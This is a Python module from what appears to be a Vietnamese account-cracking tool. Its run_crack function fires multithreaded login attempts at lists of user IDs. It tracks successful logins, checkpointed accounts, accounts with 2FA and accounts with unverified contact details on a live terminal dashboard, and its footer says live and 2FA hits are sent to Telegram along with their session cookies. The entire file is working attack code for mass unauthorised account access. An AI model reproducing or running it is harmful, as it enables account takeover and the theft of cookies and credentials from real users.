import random
import time
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from ..core.auth import login_1, login_2, login_combined
from ..models.stats import StatsManager

console = Console()

def run_crack(user_ids, method, title):
    """Hàm crack tổng quát"""
    stats = StatsManager().get()
    live_stats = {"loop":0, "oks":0, "cps":0}
    
    layout = Layout()
    layout.split(Layout(name="header", size=3), Layout(name="status", size=6), Layout(name="footer", size=3))
    
    with Live(layout, refresh_per_second=10, screen=True) as live:
        layout["header"].update(Panel(f"[bold cyan]{title}[/bold cyan]", style="cyan"))
        
        def update():
            p = live_stats['loop']
            ok_cnt = live_stats['oks']
            cp_cnt = live_stats['cps']
            uid_show = stats.last_processed_uid if stats.last_processed_uid else "..."
            status = Panel(
                f"[bold cyan][QiangDingg][/bold cyan] => [yellow][Đang Thử : {p}][/yellow] > [white]{{{uid_show}}}[/white]\n"
                f"[green][ok :{ok_cnt}][/green] > [red](cp :{cp_cnt})[/red] => [green]{{live :{stats.alive_count}}}[/green] | [red]die :{stats.die_count}[/red]\n"
                f"[yellow](2fa) :{stats.twofa_count}[/yellow] | [cyan](unv_email) :{stats.unverified_email_count}[/cyan] | [blue](unv_phone) :{stats.unverified_phone_count}[/blue]",
                title="[bold]TRẠNG THÁI[/bold]",
                border_style="cyan"
            )
            layout["status"].update(status)
        
        update()
        layout["footer"].update(Panel("[italic]ALIVE & 2FA -> gửi Telegram kèm cookie[/italic]", style="dim"))
        
        with tred(max_workers=60) as pool:
            futures = []
            for uid in user_ids:
                if method == 'A':
                    f = pool.submit(login_1, uid, live_stats)
                elif method == 'B':
                    f = pool.submit(login_2, uid, live_stats)
                else:
                    f = pool.submit(login_combined, uid, live_stats)
                futures.append(f)
                stats.set_last_uid(uid)
                update()
                live.refresh()
                time.sleep(0.05)
            for f in futures:
                f.result()
                update()
                live.refresh()
    
    console.print(f"\n[green]✓ HOÀN THÀNH! ALIVE:{stats.alive_count} 2FA:{stats.twofa_count} DIE:{stats.die_count} UNV_EMAIL:{stats.unverified_email_count} UNV_PHONE:{stats.unverified_phone_count}[/green]")
    input("[cyan]Nhấn Enter để quay lại...[/cyan]")
